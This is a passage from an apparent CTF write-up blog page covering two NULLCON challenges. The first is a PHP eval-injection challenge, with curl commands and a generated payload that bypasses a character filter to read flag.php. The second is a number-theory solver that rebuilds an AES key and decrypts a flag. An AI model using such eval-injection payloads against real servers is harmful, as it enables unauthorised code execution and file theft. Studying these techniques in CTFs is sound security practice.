<li><strong>space</strong>, <strong>digits 0‚Äì9</strong>, <code>$</code>, <code>{}</code>, <code>=</code>, <code>+</code>, <code>.</code>, <code>_</code>, <code>-</code>, <code>:</code>, <code>;</code>, <code>%</code>, <code>*</code>, <code>[ ]</code>, <code>&lt; &gt;</code>, <strong>letters <code>v</code>, <code>x</code>, <code>b</code></strong>, backtick.</li>
</ul>
</li>
<li>
<p>Then it runs: <code>eval(&quot;$input;&quot;)</code>.</p>
</li>
</ul>
<h3 id="consequences">Consequences</h3>
<ul>
<li><strong>Variables</strong> like <code>$FLAG</code> are blocked (the <code>$</code> is escaped).</li>
<li>You can‚Äôt type <strong>digits</strong>, <strong>quotes</strong>, <strong>spaces</strong>, <code>&quot;.&quot;</code>, <strong>underscore</strong>, etc.</li>
<li>But you <em>can</em> still use <strong>letters, commas, and parentheses</strong> ‚Üí function calls like <code>print()</code>, <code>file()</code>, <code>implode()</code>, <code>array()</code>, <code>chr()</code>, <code>count()</code>.</li>
</ul>
<p>Also note: the page only renders the ‚Äúresult‚Äù <code>&lt;div&gt;</code> when <code>$output</code> is <strong>truthy</strong>. <code>print()</code> returns <code>1</code>, so it guarantees that block shows.</p>
<hr>
<h2 id="recon--sanity-check">Recon / Sanity check</h2>
<p>Prove code execution without using blocked characters:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -s -X POST -d <span style="color:#e6db74">&#39;input=return(true)&#39;</span> http://52.59.124.14:5011/ <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>| sed -n <span style="color:#e6db74">&#39;s/.*id=&#34;resultText&#34;&gt;\([^&lt;]*\).*/\1/p&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># -&gt; 1</span>
</span></span></code></pre></div><p>This shows our expression is being <code>eval()</code>‚Äôd.</p>
<p>Tried the obvious constant leak:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -s -X POST -d <span style="color:#e6db74">&#39;input=return(FLAG)&#39;</span> http://52.59.124.14:5011/
</span></span><span style="display:flex;"><span>curl -s -X POST -d <span style="color:#e6db74">&#39;input=return(flag)&#39;</span> http://52.59.124.14:5011/
</span></span></code></pre></div><p>No flag ‚Üí likely the flag is <strong>not</strong> a constant, but in <code>flag.php</code> as a variable (e.g., <code>$FLAG</code>), which we can‚Äôt access directly due to <code>$</code> being blocked.</p>
<hr>
<h2 id="exploit-idea">Exploit idea</h2>
<p>We can‚Äôt type <code>&quot;flag.php&quot;</code> (quotes/digits/<code>.</code> blocked), so we <strong>synthesize</strong> it:</p>
<ul>
<li><code>array(true,true,true)</code> ‚Üí <code>count(...) = 3</code></li>
<li><code>chr(70)</code> ‚Üí <code>'F'</code> (but we can‚Äôt type <code>70</code>)</li>
<li>So we build <strong>every character</strong> via <code>chr(count(array(true,‚Ä¶)))</code></li>
<li>Then <code>implode(array(...))</code> joins characters into the string.</li>
</ul>
<p>With that, we can do:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">print</span>(<span style="color:#a6e22e">implode</span>(<span style="color:#a6e22e">file</span>(<span style="color:#e6db74">&#34;flag.php&#34;</span>)));
</span></span></code></pre></div><p>‚Ä¶but written <strong>only</strong> with allowed tokens.</p>
<hr>
<h2 id="exploit-one-liner">Exploit (one-liner)</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>URL<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://52.59.124.14:5011/&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>PAYLOAD<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>python3 - <span style="color:#e6db74">&lt;&lt;&#39;PY&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">def enc(s):
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    def block(n): return &#34;true,&#34;*(n-1)+&#34;true&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    parts = [f&#34;chr(count(array({block(ord(c))})))&#34; for c in s]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    return &#34;implode(array(&#34; + &#34;,&#34;.join(parts) + &#34;))&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">code = f&#34;print(implode(file({enc(&#39;flag.php&#39;)})))&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">print(code)
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">PY</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>curl -s -X POST --data-urlencode <span style="color:#e6db74">&#34;input=</span>$PAYLOAD<span style="color:#e6db74">&#34;</span> <span style="color:#e6db74">&#34;</span>$URL<span style="color:#e6db74">&#34;</span> | grep -o <span style="color:#e6db74">&#39;ENO{[^}]*}&#39;</span>
</span></span></code></pre></div><p><strong>Output:</strong></p>
<img src="/posts/CTF/NULLCON/slasher2.png" style="width:1200px;">
<pre tabindex="0"><code>ENO{3v4L_0nC3_Ag41n_F0r_Th3_W1n_:-)}
</code></pre><p>Why <code>grep</code>? <code>print()</code> writes the file‚Äôs contents into the HTML (outside the <code>resultText</code> div), so we scrape the flag from the whole page.</p>
<hr>
<h2 id="why-it-works-super-short">Why it works (super short)</h2>
<ul>
<li>Filters block <strong>typing</strong> dangerous characters, but not <strong>using</strong> safe functions.</li>
<li>With letters+parentheses only, we can still call <code>chr/count/array/implode/file/print</code>.</li>
<li>Build <code>&quot;flag.php&quot;</code> using counts of <code>true</code>; read and print it.</li>
<li><code>eval</code> happily executes the expression.</li>
</ul>
<hr>
<h2 id="credits--notes">Credits / Notes</h2>
<ul>
<li>Trick sometimes called ‚Äú<strong>array(true) counter / chr synthesis</strong>‚Äù.</li>
<li>Works in many languages/sandboxes where you can still call a few safe functions and build strings without quotes/digits.</li>
</ul>
<!-- ========================================================================================= -->
<div id="Powertower-100" style="text-align: center;">
  <h1>‚ú®5.Power Tower</h1>
</div>
<img src="/posts/CTF/NULLCON/powertower.png" style="width:500px;">
---
<img src="/posts/CTF/NULLCON/powertower1.png" style="width:1500px;">
---
<h2 id="whats-happening">What‚Äôs happening?</h2>
<ul>
<li>
<p><code>primes = {2,3,5,...,97}</code> (all primes &lt; 100).</p>
</li>
<li>
<p>A <strong>left-fold power tower</strong> is built:</p>
<ul>
<li><code>t0 = 1</code></li>
<li><code>t1 = 2^t0 = 2</code></li>
<li><code>t2 = 3^t1 = 3^2</code>, ‚Ä¶</li>
<li><code>t25 = 97^(‚Ä¶^(‚Ä¶))</code> = <code>int_key</code></li>
</ul>
</li>
<li>
<p>AES-256 key = the 32-byte big-endian representation of <code>int_key mod n</code>.</p>
</li>
<li>
<p>The flag is padded with <code>_</code> to a multiple of 16 and encrypted with <strong>AES-ECB</strong>.</p>
</li>
</ul>
<p>We only need <strong><code>int_key mod n</code></strong>.</p>
<hr>
<h2 id="math-trick-how-to-get-the-key-without-the-flag">Math trick (how to get the key without the flag)</h2>
<ol>
<li>
<p><strong>Factor <code>n</code></strong> (it‚Äôs not random here):</p>
<pre tabindex="0"><code>n =
127
√ó 841705194007
√ó 1005672644717572752052474808610481144121914956393489966622615553
</code></pre><p>(Two smallish primes and one large prime.)</p>
</li>
<li>
<p>Compute the tower <strong>mod each prime factor</strong>. Use:</p>
<ul>
<li><strong>Carmichael‚Äôs function</strong> <code>Œª(p^k)</code> to reduce exponents modulo the multiplicative order.</li>
<li>For the tower, the exponents are enormous after the first level, so we <strong>add <code>Œª</code></strong> to keep exponents within the correct cycle.</li>
<li><strong>Prime-power short-circuit:</strong> if base shares a factor with <code>p^k</code>, then <code>a^e ‚â° 0 (mod p^k)</code> for large enough <code>e</code>.</li>
</ul>
</li>
<li>
<p>Combine the three residues with the <strong>Chinese Remainder Theorem (CRT)</strong> ‚Üí <code>int_key % n</code>.</p>
</li>
<li>
<p>Convert to 32 bytes ‚Üí <strong>AES key</strong>.</p>
</li>
<li>
<p><strong>Decrypt</strong> the ciphertext in <code>cipher.txt</code> with AES-ECB, then strip trailing underscores.</p>
</li>
</ol>
<hr>
<h2 id="solver">Solver</h2>
<blockquote>
<p>Save as <code>solve.py</code> next to <code>cipher.txt</code>.</p></blockquote>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#75715e"># solve.py ‚Äî rebuild AES key (int_key mod n) and decrypt cipher.txt</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> Crypto.Cipher <span style="color:#f92672">import</span> AES
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> math <span style="color:#f92672">import</span> gcd
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> functools <span style="color:#f92672">import</span> reduce
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> sympy <span style="color:#f92672">import</span> factorint, isprime
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Inputs from chall.py / cipher.txt</span>
</span></span><span style="display:flex;"><span>n <span style="color:#f92672">=</span> <span style="color:#ae81ff">107502945843251244337535082460697583639357473016005252008262865481138355040617</span>
</span></span><span style="display:flex;"><span>C_hex <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;cipher.txt&#34;</span>,<span style="color:#e6db74">&#34;r&#34;</span>)<span style="color:#f92672">.</span>read()<span style="color:#f92672">.</span>strip()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># primes &lt; 100</span>
</span></span><span style="display:flex;"><span>PRIMES <span style="color:#f92672">=</span> [<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">5</span>,<span style="color:#ae81ff">7</span>,<span style="color:#ae81ff">11</span>,<span style="color:#ae81ff">13</span>,<span style="color:#ae81ff">17</span>,<span style="color:#ae81ff">19</span>,<span style="color:#ae81ff">23</span>,<span style="color:#ae81ff">29</span>,<span style="color:#ae81ff">31</span>,<span style="color:#ae81ff">37</span>,<span style="color:#ae81ff">41</span>,<span style="color:#ae81ff">43</span>,<span style="color:#ae81ff">47</span>,<span style="color:#ae81ff">53</span>,<span style="color:#ae81ff">59</span>,<span style="color:#ae81ff">61</span>,<span style="color:#ae81ff">67</span>,<span style="color:#ae81ff">71</span>,<span style="color:#ae81ff">73</span>,<span style="color:#ae81ff">79</span>,<span style="color:#ae81ff">83</span>,<span style="color:#ae81ff">89</span>,<span style="color:#ae81ff">97</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Factorization of n (primes)</span>
</span></span><span style="display:flex;"><span>FACTORS_N <span style="color:#f92672">=</span> [
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">127</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">841705194007</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">1005672644717572752052474808610481144121914956393489966622615553</span>
</span></span><span style="display:flex;"><span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">lcm</span>(a,b): <span style="color:#66d9ef">return</span> a <span style="color:#f92672">//</span> gcd(a,b) <span style="color:#f92672">*</span> b
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">lcm_many</span>(xs): <span style="color:#66d9ef">return</span> reduce(lcm, xs, <span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">carmichael_lambda_from_factorint</span>(factors: dict) <span style="color:#f92672">-&gt;</span> int:
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Œª(p^k): odd p =&gt; p^(k-1)(p-1); for 2: 1,2,2^(k-2) (k&gt;=3)</span>
</span></span><span style="display:flex;"><span>    parts <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> p, k <span style="color:#f92672">in</span> factors<span style="color:#f92672">.</span>items():
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> p <span style="color:#f92672">==</span> <span style="color:#ae81ff">2</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> k <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>: parts<span style="color:#f92672">.</span>append(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">elif</span> k <span style="color:#f92672">==</span> <span style="color:#ae81ff">2</span>: parts<span style="color:#f92672">.</span>append(<span style="color:#ae81ff">2</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span>: parts<span style="color:#f92672">.</span>append(<span style="color:#ae81ff">1</span> <span style="color:#f92672">&lt;&lt;</span> (k<span style="color:#f92672">-</span><span style="color:#ae81ff">2</span>))
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>            parts<span style="color:#f92672">.</span>append((p<span style="color:#f92672">**</span>(k<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)) <span style="color:#f92672">*</span> (p<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>))
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> lcm_many(parts)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">crt_pair</span>(a1, m1, a2, m2):
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># x ‚â° a1 (mod m1), x ‚â° a2 (mod m2), coprime moduli</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">eg</span>(a, b):
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> b <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>: <span style="color:#66d9ef">return</span> (<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, a)
</span></span><span style="display:flex;"><span>        x, y, g <span style="color:#f92672">=</span> eg(b, a <span style="color:#f92672">%</span> b)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> (y, x <span style="color:#f92672">-</span> (a <span style="color:#f92672">//</span> b) <span style="color:#f92672">*</span> y, g)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">assert</span> gcd(m1, m2) <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>    s, t, g <span style="color:#f92672">=</span> eg(m1, m2)
</span></span><span style="display:flex;"><span>    x <span style="color:#f92672">=</span> (a1 <span style="color:#f92672">*</span> t <span style="color:#f92672">*</span> m2 <span style="color:#f92672">+</span> a2 <span style="color:#f92672">*</span> s <span style="color:#f92672">*</span> m1) <span style="color:#f92672">%</span> (m1<span style="color:#f92672">*</span>m2)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> x, m1<span style="color:#f92672">*</span>m2
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">crt_many</span>(residues, moduli):
</span></span><span style="display:flex;"><span>    x, m <span style="color:#f92672">=</span> residues[<span style="color:#ae81ff">0</span>], moduli[<span style="color:#ae81ff">0</span>]
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> a, mod <span style="color:#f92672">in</span> zip(residues[<span style="color:#ae81ff">1</span>:], moduli[<span style="color:#ae81ff">1</span>:]):
</span></span><span style="display:flex;"><span>        x, m <span style="color:#f92672">=</span> crt_pair(x, m, a, mod)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> x
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">tower_mod</span>(primes, m):
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;&#34;&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Left-fold tower modulo m:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      t0=1; t_i = primes[i-1] ** t_{i-1}
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Use Carmichael reductions and prime-power short-circuits.
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> m <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>: <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> primes: <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">%</span> m
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    a <span style="color:#f92672">=</span> primes[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>    prev <span style="color:#f92672">=</span> primes[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    fac <span style="color:#f92672">=</span> factorint(m)
</span></span><span style="display:flex;"><span>    residues <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span>    moduli <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> p, k <span style="color:#f92672">in</span> fac<span style="color:#f92672">.</span>items():
</span></span><span style="display:flex;"><span>        mk <span style="color:#f92672">=</span> p<span style="color:#f92672">**</span>k
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> a <span style="color:#f92672">%</span> p <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> len(prev) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
</span></span><span style="display:flex;"><span>                res <span style="color:#f92672">=</span> a <span style="color:#f92672">%</span> mk
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>                res <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>  <span style="color:#75715e"># exponent huge ‚áí a^e ‚â° 0 (mod p^k)</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>            lam <span style="color:#f92672">=</span> carmichael_lambda_from_factorint({p: k})
</span></span><span style="display:flex;"><span>            e <span style="color:#f92672">=</span> tower_mod(prev, lam)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> len(prev) <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">1</span>:
</span></span><span style="display:flex;"><span>                e <span style="color:#f92672">+=</span> lam  <span style="color:#75715e"># keep exponent in the large cycle</span>
</span></span><span style="display:flex;"><span>            res <span style="color:#f92672">=</span> pow(a, e, mk)
</span></span><span style="display:flex;"><span>        residues<span style="color:#f92672">.</span>append(res)
</span></span><span style="display:flex;"><span>        moduli<span style="color:#f92672">.</span>append(mk)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> crt_many(residues, moduli)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Sanity: factors are prime</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> pfac <span style="color:#f92672">in</span> FACTORS_N:
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">assert</span> isprime(pfac)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># int_key % n by CRT over prime factors</span>
</span></span><span style="display:flex;"><span>residues <span style="color:#f92672">=</span> [tower_mod(PRIMES, pfac) <span style="color:#66d9ef">for</span> pfac <span style="color:#f92672">in</span> FACTORS_N]
</span></span><span style="display:flex;"><span>int_key_mod_n <span style="color:#f92672">=</span> crt_many(residues, FACTORS_N)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 32-byte big-endian key</span>
</span></span><span style="display:flex;"><span>key <span style="color:#f92672">=</span> int_key_mod_n<span style="color:#f92672">.</span>to_bytes(<span style="color:#ae81ff">32</span>, <span style="color:#e6db74">&#39;big&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Decrypt</span>
</span></span><span style="display:flex;"><span>cipher <span style="color:#f92672">=</span> bytes<span style="color:#f92672">.</span>fromhex(C_hex)
</span></span><span style="display:flex;"><span>pt <span style="color:#f92672">=</span> AES<span style="color:#f92672">.</span>new(key, AES<span style="color:#f92672">.</span>MODE_ECB)<span style="color:#f92672">.</span>decrypt(cipher)
</span></span><span style="display:flex;"><span>flag <span style="color:#f92672">=</span> pt<span style="color:#f92672">.</span>rstrip(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;_&#39;</span>)<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-8&#39;</span>, <span style="color:#e6db74">&#39;ignore&#39;</span>)
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;Flag:&#34;</span>, flag)
</span></span></code></pre></div><h3 id="run">Run</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 -m pip install pycryptodome sympy
</span></span><span style="display:flex;"><span>python3 solve.py
</span></span></code></pre></div><p><strong>Output</strong></p>
<hr>
<img src="/posts/CTF/NULLCON/powertower2.png" style="width:1500px;">
<pre tabindex="0"><code>Flag: ENO{m4th_tr1ck5_c4n_br1ng_s0me_3ffic13ncy}
</code></pre><hr>
<h2 id="why-it-works-intuitive">Why it works (intuitive)</h2>
<ul>
<li>You only care about <code>int_key (mod n)</code>.</li>
<li>If <code>n = p1 * p2 * p3</code> (primes), compute <code>int_key (mod p1)</code>, <code>int_key (mod p2)</code>, <code>int_key (mod p3)</code> separately.</li>
<li>Exponent arithmetic modulo a prime power uses <strong>Carmichael‚Äôs function</strong> to shrink the exponent (recursively).</li>
<li>When base shares a factor with <code>p^k</code>, big exponents collapse to <strong>0 mod p^k</strong>.</li>
<li>CRT stitches the residues back into a single value modulo <code>n</code>.</li>
<li>Turn that into 32 bytes ‚Üí AES-256 key. Decrypt with AES-ECB.</li>
</ul>
<hr>
<h2 id="lessons-learned">Lessons learned</h2>
<ul>
<li><strong>Never</strong> try to compute monster towers directly‚Äî<strong>work modulo</strong> small factors.</li>
<li><strong>Carmichael/Euler reductions</strong> and <strong>CRT</strong> are must-know tools in crypto CTFs.</li>
<li>AES-ECB has <strong>no IV</strong>; once the key is known, decryption is trivial.</li>
<li>Custom padding (<code>'_'</code>) is easy to strip after decrypting.</li>
</ul>
<hr>
<h2 id="credit--tools">Credit / Tools</h2>
<ul>
<li>Python, <code>pycryptodome</code> (AES), <code>sympy</code> (factorization utilities).</li>
<li>Classic number theory: Carmichael Œª, CRT.</li>
</ul>
<pre tabindex="0"><code></code></pre><!-- ========================================================================================= -->
<!-- ========================================================================================= -->
<!-- ========================================================================================= -->
<p><em>Last updated:</em> 07 Sep 2025</p>

    </div>

    <p class="back"><a href="/ctf/">‚Üê Back to CTF</a></p>
  </div>

<script async src="http://localhost:1313/js/bundle.min.c7c384e4d29d192bbac6811ae4660bb01767194a5bea56baca77e8260f93ea16.js" integrity="sha256-x8OE5NKdGSu6xoEa5GYLsBdnGUpb6la6ynfoJg+T6hY=" crossorigin="anonymous"></script>
</body>
</html>
